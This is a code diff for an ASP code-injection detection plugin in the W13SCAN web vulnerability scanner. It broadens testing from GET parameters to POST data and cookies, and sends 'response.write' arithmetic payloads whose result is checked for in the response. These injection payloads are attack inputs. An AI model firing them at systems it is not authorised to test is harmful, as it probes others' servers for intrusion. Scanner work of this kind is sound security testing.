@@ -9,62 +9,61 @@ import random
 
 import requests
 
-from W13SCAN.lib.common import prepare_url
-from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
-from W13SCAN.lib.output import out
-from W13SCAN.lib.plugins import PluginBase
+from api import PluginBase, WEB_PLATFORM, conf, PLACE, HTTPMETHOD, ResultObject, VulType, output, generateResponse
+from lib.core.common import paramsCombination
 
 
 class W13SCAN(PluginBase):
     name = 'ASP代码注入'
-    desc = '''暂只支持Get请求方式和回显型的PHP代码注入'''
-    level = Level.HIGHT
+    desc = '''暂只支持回显型的ASP代码注入,当level>4时会无视环境识别因素进行fuzz'''
 
     def audit(self):
-        method = self.requests.command  # 请求方式 GET or POST
-        headers = self.requests.get_headers()  # 请求头 dict类型
-        url = self.build_url()  # 请求完整URL
-
-        resp_data = self.response.get_body_data()  # 返回数据 byte类型
-        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
-        resp_headers = self.response.get_headers()  # 返回头 dict类型
-
-        p = self.requests.urlparse
-        params = self.requests.params
-        netloc = self.requests.netloc
-
-        if self.response.language and self.response.language != "ASP":
+        if WEB_PLATFORM.ASP not in self.response.programing and conf.level < 2:
             return
 
-        if method == 'GET':
-            if p.query == '':
-                return
-            exi = os.path.splitext(p.path)[1]
-            if exi not in acceptedExt:
-                return
+        randint1 = random.randint(10000, 90000)
+        randint2 = random.randint(10000, 90000)
+        randint3 = randint1 * randint2
+        headers = self.requests.headers
 
-            randint1 = random.randint(10000, 90000)
-            randint2 = random.randint(10000, 90000)
-            randint3 = randint1 * randint2
+        payloads = [
+            'response.write({}*{})'.format(randint1, randint2),
+            '\'+response.write({}*{})+\''.format(randint1, randint2),
+            '"response.write({}*{})+"'.format(randint1, randint2),
+        ]
+        iterdatas = []
+        if self.requests.method == HTTPMETHOD.GET:
+            iterdatas.append((self.requests.params, PLACE.GET))
+        elif self.requests.method == HTTPMETHOD.POST:
+            iterdatas.append((self.requests.post_data, PLACE.POST))
+        if conf.level >= 3:
+            iterdatas.append((self.requests.cookies, PLACE.COOKIE))
 
-            payloads = [
-                'response.write({}*{})'.format(randint1, randint2),
-                '\'+response.write({}*{})+\''.format(randint1, randint2),
-                '"response.write({}*{})+"'.format(randint1, randint2),
-            ]
-
-            for k, v in params.items():
-                if k.lower() in ignoreParams:
-                    continue
-                data = copy.deepcopy(params)
+        for item in iterdatas:
+            iterdata, positon = item
+            for k, v in iterdata.items():
+                data = copy.deepcopy(iterdata)
                 for payload in payloads:
-                    if payload[0] == "":
+                    if payload[0] == "r":
                         data[k] = payload
                     else:
                         data[k] = v + payload
-                    url1 = prepare_url(netloc, params=data)
-                    r = requests.get(url1, headers=headers)
+                    params = paramsCombination(data, positon)
+                    if positon == PLACE.GET:
+                        r = requests.get(self.requests.netloc, params=params, headers=headers)
+                    elif positon == PLACE.POST:
+                        r = requests.post(self.requests.url, data=params, headers=headers)
+                    elif positon == PLACE.COOKIE:
+                        if self.requests.method == HTTPMETHOD.GET:
+                            r = requests.get(self.requests.url, headers=headers, cookies=params)
+                        elif self.requests.method == HTTPMETHOD.POST:
+                            r = requests.post(self.requests.url, data=self.requests.post_data, headers=headers,
+                                              cookies=params)
                     html1 = r.text
                     if str(randint3) in html1:
-                        out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
-                        break
+                        result = ResultObject(self)
+                        result.init_info(self.requests.url, "发现asp代码注入", VulType.CMD_INNJECTION)
+                        result.add_detail("payload探测", r.reqinfo, generateResponse(r),
+                                          "探测payload:{},并发现回显数字{}".format(data[k], randint3), k, data[k], positon)
+                        output.success(result)
+                        return
